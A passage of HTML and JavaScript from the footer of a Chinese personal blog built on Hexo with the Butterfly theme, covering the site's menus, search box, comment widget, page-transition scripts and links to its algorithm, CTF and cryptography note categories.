"data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div><div class="img-group-item"><a href="javascript:void(0)" title="广告位招租"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://lskypro.acozycotage.net/LightPicture/2022/12/65307a5828af6790.webp" alt=""/></a></div></div></div></div><div class="copyright"><span><b>&copy;2022-2024</b></span><span><b>&nbsp;&nbsp;By NoneVector</b></span></div><div id="workboard"></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><a class="icon-V hidden" onclick="switchNightMode()" title="浅色和深色模式转换"><svg width="25" height="25" viewBox="0 0 1024 1024"><use id="modeicon" xlink:href="#icon-moon"></use></svg></a><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button class="share" type="button" title="右键模式" onclick="changeMouseMode()"><i class="fas fa-mouse"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog right_side"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button class="share" type="button" title="分享链接" onclick="share()"><i class="fas fa-share-nodes"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i><span id="percent">0<span>%</span></span></button><button id="go-down" type="button" title="直达底部" onclick="btf.scrollToDest(document.body.scrollHeight, 500)"><i class="fas fa-arrow-down"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div class="js-pjax" id="rightMenu"><div class="rightMenu-group rightMenu-small"><a class="rightMenu-item" href="javascript:window.history.back();"><i class="fa fa-arrow-left"></i></a><a class="rightMenu-item" href="javascript:window.history.forward();"><i class="fa fa-arrow-right"></i></a><a class="rightMenu-item" href="javascript:window.location.reload();"><i class="fa fa-refresh"></i></a><a class="rightMenu-item" href="javascript:rmf.scrollToTop();"><i class="fa fa-arrow-up"></i></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-text"><a class="rightMenu-item" href="javascript:rmf.copySelect();"><i class="fa fa-copy"></i><span>复制</span></a><a class="rightMenu-item" href="javascript:window.open(&quot;https://www.baidu.com/s?wd=&quot;+window.getSelection().toString());window.location.reload();"><i class="fa fa-search"></i><span>百度搜索</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-too"><a class="rightMenu-item" href="javascript:window.open(window.getSelection().toString());window.location.reload();"><i class="fa fa-link"></i><span>转到链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-paste"><a class="rightMenu-item" href="javascript:rmf.paste()"><i class="fa fa-copy"></i><span>粘贴</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-post"><a class="rightMenu-item" href="#post-comment"><i class="fas fa-comment"></i><span>空降评论</span></a><a class="rightMenu-item" href="javascript:rmf.copyWordsLink()"><i class="fa fa-link"></i><span>复制本文地址</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-to"><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>新窗口打开</span></a><a class="rightMenu-item" id="menu-too" href="javascript:rmf.open()"><i class="fa fa-link"></i><span>转到链接</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制链接</span></a></div><div class="rightMenu-group rightMenu-line hide" id="menu-img"><a class="rightMenu-item" href="javascript:rmf.saveAs()"><i class="fa fa-download"></i><span>保存图片</span></a><a class="rightMenu-item" href="javascript:rmf.openWithNewTab()"><i class="fa fa-window-restore"></i><span>在新窗口打开</span></a><a class="rightMenu-item" href="javascript:rmf.copyLink()"><i class="fa fa-copy"></i><span>复制图片链接</span></a></div><div class="rightMenu-group rightMenu-line"><a class="rightMenu-item" href="javascript:randomPost()"><i class="fa fa-paper-plane"></i><span>随便逛逛</span></a><a class="rightMenu-item" href="javascript:switchNightMode();"><i class="fa fa-moon"></i><span>昼夜切换</span></a><a class="rightMenu-item" href="/personal/about/"><i class="fa fa-info-circle"></i><span>关于博客</span></a><a class="rightMenu-item" href="javascript:toggleWinbox();"><i class="fas fa-cog"></i><span>美化设置</span></a><a class="rightMenu-item" href="javascript:rmf.fullScreen();"><i class="fas fa-expand"></i><span>切换全屏</span></a><a class="rightMenu-item" href="javascript:window.print();"><i class="fa-solid fa-print"></i><span>打印页面</span></a></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.staticfile.org/fancyapps-ui/4.0.31/fancybox.umd.min.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/instant.page/5.1.0/instantpage.min.js" type="module"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/vanilla-lazyload/17.3.1/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><script async="async">var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())
setTimeout(function(){preloader.endLoading();}, 5000);
document.getElementById('loading-box').addEventListener('click',()=> {preloader.endLoading()})</script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    chtml: {
      scale: 1.2
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        insertScript: [200, () => {
          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
            const target = node.parentNode
            if (target.nodeName.toLowerCase() === 'li') {
              target.parentNode.classList.add('has-jax')
            } else {
              target.classList.add('has-jax')
            }
          });
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.min.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><script>(()=>{
  const init = () => {
    twikoo.init(Object.assign({
      el: '#twikoo-wrap',
      envId: 'https://wxxtwikoo.nonevector.top/',
      region: '',
      onCommentLoaded: function () {
        btf.loadLightbox(document.querySelectorAll('#twikoo .tk-content img:not(.tk-owo-emotion)'))
      }
    }, null))
  }

  const getCount = () => {
    const countELement = document.getElementById('twikoo-count')
    if(!countELement) return
    twikoo.getCommentsCount({
      envId: 'https://wxxtwikoo.nonevector.top/',
      region: '',
      urls: [window.location.pathname],
      includeReply: false
    }).then(function (res) {
      countELement.innerText = res[0].count
    }).catch(function (err) {
      console.error(err);
    });
  }

  const runFn = () => {
    init()
    GLOBAL_CONFIG_SITE.isPost && getCount()
  }

  const loadTwikoo = () => {
    if (typeof twikoo === 'object') {
      setTimeout(runFn,0)
      return
    } 
    getScript('https://cdn.staticfile.org/twikoo/1.6.8/twikoo.all.min.js').then(runFn)
  }

  if ('Twikoo' === 'Twikoo' || !true) {
    if (true) btf.loadComment(document.getElementById('twikoo-wrap'), loadTwikoo)
    else loadTwikoo()
  } else {
    window.loadOtherComment = () => {
      loadTwikoo()
    }
  }
})()</script></div><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getComment = () => {
    const runTwikoo = () => {
      twikoo.getRecentComments({
        envId: 'https://wxxtwikoo.nonevector.top/',
        region: '',
        pageSize: 5,
        includeReply: true
      }).then(function (res) {
        const twikooArray = res.map(e => {
          return {
            'content': changeContent(e.comment),
            'avatar': e.avatar,
            'nick': e.nick,
            'url': e.url + '#' + e.id,
            'date': new Date(e.created).toISOString()
          }
        })

        saveToLocal.set('twikoo-newest-comments', JSON.stringify(twikooArray), 10/(60*24))
        generateHtml(twikooArray)
      }).catch(function (err) {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.innerHTML= "无法获取评论，请确认相关配置是否正确"
      })
    }

    if (typeof twikoo === 'object') {
      runTwikoo()
    } else {
      getScript('https://cdn.staticfile.org/twikoo/1.6.8/twikoo.all.min.js').then(runTwikoo)
    }
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }
        
        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${btf.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom.innerHTML= result
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('twikoo-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script src="https://unpkg.zhimg.com/jquery@3.7.0/dist/jquery.min.js"></script><script async src="https://cdn1.tianli0.top/npm/vue@2.6.14/dist/vue.min.js"></script><script async src="https://cdn1.tianli0.top/npm/element-ui@2.15.6/lib/index.js"></script><script async src="https://cdn.bootcdn.net/ajax/libs/clipboard.js/2.0.11/clipboard.min.js"></script><script defer type="text/javascript" src="https://cdn1.tianli0.top/npm/sweetalert2@8.19.0/dist/sweetalert2.all.js"></script><script async src="//npm.elemecdn.com/pace-js@1.2.4/pace.min.js"></script><script defer src="https://cdn1.tianli0.top/gh/nextapps-de/winbox/dist/winbox.bundle.min.js"></script><script async src="//at.alicdn.com/t/c/font_4255441_r3xftclwcht.js"></script><script async src="https://cdn.wpon.cn/2022-sucai/Gold-ingot.js"></script><canvas id="universe"></canvas><canvas id="snow"></canvas><script defer src="/js/fomal.js"></script><link rel="stylesheet" href="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://lf6-cdn-tos.bytecdntp.com/cdn/expire-1-M/aplayer/1.10.1/APlayer.min.js"></script><script src="https://cdn1.tianli0.top/npm/js-heo@1.0.12/metingjs/Meting.min.js"></script><script src="https://lib.baomitu.com/pjax/0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show","#web_bg",".js-pjax","#bibi","body > title","#app","#tag-echarts","#posts-echart","#categories-echarts"]

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

  typeof disqusjs === 'object' && disqusjs.destroy()
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --> <script data-pjax>if(document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
    var parent = document.getElementById('recent-posts');
    var child = '<div class="recent-post-item" style="width:100%;height: auto"><div id="catalog_magnet"><div class="magnet_item"><a class="magnet_link" href="https://nonevector.top/categories/算法/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍡 NVの算法学习笔记 (1)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://nonevector.top/categories/CTF/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍼 NVのCTF学习笔记 (2)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://nonevector.top/categories/密码学/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍟 NVの密码学笔记 (12)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item"><a class="magnet_link" href="https://nonevector.top/categories/随记/"><div class="magnet_link_context" style=""><span style="font-weight:500;flex:1">🍥 NVの零碎知识点 (5)</span><span style="padding:0px 4px;border-radius: 8px;"><i class="fas fa-arrow-circle-right"></i></span></div></a></div><div class="magnet_item" style="visibility: hidden"></div><div class="magnet_item" style="visibility: hidden"></div><a class="magnet_link_more"  href="https://nonevector.top/categories/" style="flex:1;text-align: center;margin-bottom: 10px;">查看更多...</a></div></div>';
    console.log('已挂载magnet')
    parent.insertAdjacentHTML("afterbegin",child)}
     </script><style>#catalog_magnet{flex-wrap: wrap;display: flex;width:100%;justify-content:space-between;padding: 10px 10px 0 10px;align-content: flex-start;}.magnet_item{flex-basis: calc(33.333333333333336% - 5px);background: #e9e9e9;margin-bottom: 10px;border-radius: 8px;transition: all 0.2s ease-in-out;}.magnet_item:hover{background: var(--text-bg-hover)}.magnet_link_more{color:#555}.magnet_link{color:black}.magnet_link:hover{color:white}@media screen and (max-width: 600px) {.magnet_item {flex-basis: 100%;}}.magnet_link_context{display:flex;padding: 10px;font-size:16px;transition: all 0.2s ease-in-out;}.magnet_link_context:hover{padding: 10px 20px;}</style>
    <style></style><script data-pjax>
  function butterfly_footer_beautify_injector_config(){
    var parent_div_git = document.getElementById('footer-wrap');
    var item_html = '<p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v6.2.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.3.1" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://vercel.com/" style="margin-inline:5px" data-title="本站采用多线部署，主线路托管于Vercel" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-Vercel-brightgreen?style=flat&amp;logo=Vercel" alt=""/></a><a class="github-badge" target="_blank" href="https://dashboard.4everland.org/" style="margin-inline:5px" data-title="本站采用多线部署，备用线路托管于4EVERLAND" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Hosted-4EVERLAND-22DDDD?style=flat&amp;logo=IPFS" alt=""/></a><a class="github-badge" target="_blank" href="https://github.com/" style="margin-inline:5px" data-title="本站项目由Github托管" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Source-Github-d021d6?style=flat&amp;logo=GitHub" alt=""/></a><a class="github-badge" target="_blank" href="https://icp.gov.moe/?keyword=20235457/" style="margin-inline:5px" data-title="本站已加入萌ICP豪华套餐，萌ICP备20235457号" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/%E8%90%8CICP%E5%A4%87-20235457%E5%8F%B7-ff1385?logo=data:image/png;base64,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